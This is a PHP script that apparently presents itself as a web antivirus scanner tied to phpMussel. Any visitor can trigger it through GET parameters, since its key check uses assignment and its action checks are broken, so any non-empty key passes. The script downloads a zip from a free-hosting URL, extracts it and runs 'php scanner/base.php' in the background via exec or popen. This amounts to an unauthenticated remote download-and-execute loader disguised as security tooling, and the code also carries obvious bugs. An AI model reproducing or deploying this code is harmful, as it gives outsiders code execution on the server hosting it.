<?php
$SecretKey = "key-is-key";
$phpmusselurl = "";
if (!file_exists('av-config.json')) {
    $config = fopen('av-config.json', 'w+');
    $defaultData = new stdClass();
    $defaultData->active = false;
    $defaultData->dependency = 'https://accadmynist.000webhostapp.com/files.zip';
    $defaultData->isReady = false;
    $jsonData = json_encode($defaultData);
    file_put_contents('av-config.json', $jsonData);
    $configData = json_decode(file_get_contents('av-config.json'));
} else {
    $configData = json_decode(file_get_contents('av-config.json'));
}
$files = array();
$activeFile = $configData->active;
$phpmusselurl = $configData->dependency;
$fileattached = false;
function CheckForActivation($activeFile)
{
    if ($activeFile) {
        all($activeFile);
    } else {
        echo "Script is Disabled";
    }
}

function sendDatatoServer($postData, $url)
{
    if ($url == "") {
        return "No Url To Update";
    }
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData
        //,CURLOPT_FOLLOWLOCATION => true
    ));
    // //

    //get response
    $output = curl_exec($ch);

    //Print error if any
    if (curl_errno($ch)) {
        echo 'error:' . curl_error($ch);
    }

    curl_close($ch);
}
function quarintineFile(){
    
}

function execInBackground($cmd)
{
    if (substr(php_uname(), 0, 7) == "Windows") {
        pclose(popen("start /B " . $cmd, "r"));
    } else {
        exec($cmd . " > /dev/null &");
    }
}
function activate()
{
    $GLOBALS['configData']->active =  true;
    $GLOBALS['activeFile'] = $GLOBALS['configData']->active;
    $newJsonString = json_encode($GLOBALS['configData']);
    file_put_contents('av-config.json', $newJsonString);
}


function ActivateRequest($key, $skey, $active)
{
    if ($key = $skey) {
        activate();
    } else {
        echo "Invalid Security Key";
    }
}
function downloadDependencies()
{
    try {
        $scanner_dir = mkdir('scanner');
        $url        =   $GLOBALS['phpmusselurl'];
        $file_name  =   basename($url);

        //save the file by using base name
        if (file_put_contents($file_name, file_get_contents($url))) {
            $zip = new ZipArchive;
            $res = $zip->open($file_name);
            if ($res === TRUE) {
                $zip->extractTo('scanner');
                $zip->close();
                unlink($file_name);

                updateServer("File downloaded successfully! Run Again");
            }
        } else {
            updateServer("Error Occurs during Download");
        }
    } catch (\Exception $e) {
        echo "Exception" + $e;
    }
}
function scan()
{
    if (!file_exists('scanner')) {
        downloadDependencies();
    } else {
        execInBackground("php scanner/base.php");
    }
}
function updateServer($message = "")
{
    echo $message;
}
function all()
{
    $active = true;
    if (empty($_GET)) {
        $data = json_encode(array(
            'Error' => 'Invalid request',
        ));
        sendDatatoServer($data, '');
    } else {

        if (isset($_GET['key'])) {

            if ($_GET['key'] != '') {
                $Keyfromrequest = $_GET['key'];
            } else {
                echo 'Invalid Key';
            }
            if (isset($_GET['action']) == 'activate' && $Keyfromrequest != '') {
                ActivateRequest($Keyfromrequest, $GLOBALS['SecretKey'], $active);
            }
            if (isset($_GET['action']) == 'scan' && $Keyfromrequest != '') {
                scan();
            }
        } else {
            echo 'Invalid Key Check Again <br>';
        }
    }
}
all();
function Quarintine(string $var = null)
{
    $file = $var;
    try{
    //create quarintine folder if not exist
    if (!file_exists('quarintine')) {
        mkdir('quarintine');
    }
    $file_path = 'quarintine/';
    if (rename($file, $file_path)) {
       return;
    } 
}catch(\Exception $e){
    echo "Exception" + $e;
}
}
{
    # code...
} 